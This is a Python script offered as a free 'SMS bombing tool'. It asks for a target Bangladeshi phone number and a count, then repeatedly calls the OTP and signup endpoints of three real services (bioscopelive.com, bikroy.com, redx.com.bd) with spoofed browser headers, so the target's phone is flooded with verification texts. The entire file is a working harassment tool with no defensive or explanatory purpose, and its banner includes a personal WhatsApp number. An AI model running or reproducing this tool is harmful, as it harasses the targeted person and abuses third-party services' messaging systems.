import requests,os
import sys
os.system('clear')
bch=('''
 \033[1;32m                ______   _______  _______  _______  ______   _______  _______ 
|\     /|       (  ___ \ (  ___  )(  ___  )(       )(  ___ \ (  ____ \(  ____ )
( \   / )       | (   ) )| (   ) || (   ) || () () || (   ) )| (    \/| (    )|
 \ (_) / _____  | (__/ / | |   | || |   | || || || || (__/ / | (__    | (____)|
  ) _ ( (_____) |  __ (  | |   | || |   | || |(_)| ||  __ (  |  __)   |     __)
 / ( ) \        | (  \ \ | |   | || |   | || |   | || (  \ \ | (      | (\ (   
( /   \ )       | )___) )| (___) || (___) || )   ( || )___) )| (____/\| ) \ \__
|/     \|       |/ \___/ (_______)(_______)|/     \||/ \___/ (_______/|/   \__/
╔═════════════════════════════════════════════════════════════════════════════╗
║                    \033[1;33m WELLCOME TO OUR SMS BOOMBING TOOL\033[0m \033[1;32m                      ║
╚═════════════════════════════════════════════════════════════════════════════╝
╔═════════════════════════════════════════════════════════════════════════════╗
║                [✓]  AUTHOR    :    \033[1;31m TERTHO \033[0m  \033[1;32m                               ║
║                [✓]  GITHUB    :     \033[1;31mX-MAX-99 \033[0m \033[1;32m                              ║
║                [✓]  WATSAPP   :     \033[1;31m01733782883 \033[0m    \033[1;32m                        ║
║                [✓]  TOOL      :     \033[1;31mSMS BOOMBING \033[0m \033[1;32m                          ║
║                [✓]  STATUS    :     \033[1;31mFREE\033[0m \033[1;32m                                   ║
║                [✓]  LOVE FROM :     \033[1;31mSTLP TEAM\033[0m \033[1;32m                              ║
╚═════════════════════════════════════════════════════════════════════════════╝
╔════════════════════════════════[ \033[1;33mNOTICE\033[0m\033[1;32m ]═══════════════════════════════════╗
║        ★ \033[1;35mTHIS TOOLS IS FREE SO ENJOY IT AND SHARE YOUR FRIENDS o_o\033[0m \033[1;32m*        ║
╚═════════════════════════════════════════════════════════════════════════════╝
''')
print(bch)
fb='\t \033[1;32m[1] FOLLOW MY FACEBOOK ID'
eit='\t \033[1;31m[2] EXIT '
opt='\t \t \033[1;33mOPTIONS'
xml=(f'{opt} \n{fb} \n{eit} ')
print(xml)
ent=input('\n \t \033[1;36mENTER YOUR CHOICE : ')
if ent=='1' or ent=='01':
  os.system('xdg-open https://www.facebook.com/profile.php?id=100086401971849')
  ab=input(' \n \t ENTER MY FB ID NAME : ')
elif ent=='2' or ent=='02':
  print('\033[1;33m \n \t \033[1;31mSTOPED BY YOUR WISH')
  sys.exit()
else:
  print(' \033[1;31mYOU ENTERED WRONG OPTION ')
  sys.exit()

os.system('clear')
print(bch)
enuk=(' \n \n \t \033[1;31mENTER NUMBER WITHOUT (\033[1;32m+880\033[1;31m) ')
print(enuk)
enum=input(' \n \t [✓]ENTER TERGET NUMBER +880 : ')
tot=int(input(' \n \t [✓]ENTER AMOUNT : '))
print(tot)
hdr1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
lnk1='https://www.bioscopelive.com/en/login/send-otp?phone=880'+enum+'&operator=bd-otp'
hdr2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
lnk2='https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=880'+enum
data={
  "name": enum,
  "phoneNumber": enum,
  "service": "redx",}
hdr3={
 "referer":"https://redx.com.bd/",
 "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"}
fal=0
while tot>fal:
  go1=requests.get(lnk1,headers=hdr1)
  if go1.status_code==200:
    fal+=1
    print(f"{fal} [✓] DONE")
  else:
    pass
  go2=requests.get(lnk2,headers=hdr2)
  if go2.status_code==200:
    fal+=1
    print(f"{fal} [✓] DONE")
    
  else:
    pass
  go3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=hdr3,data=data)
  if go3.status_code==200:
    fal+=1
    print(f"{fal} [✓] DONE")
    
  else:
    pass
print("YOUR BOOMBING IS SUCCESSFULLY COMPLETED")
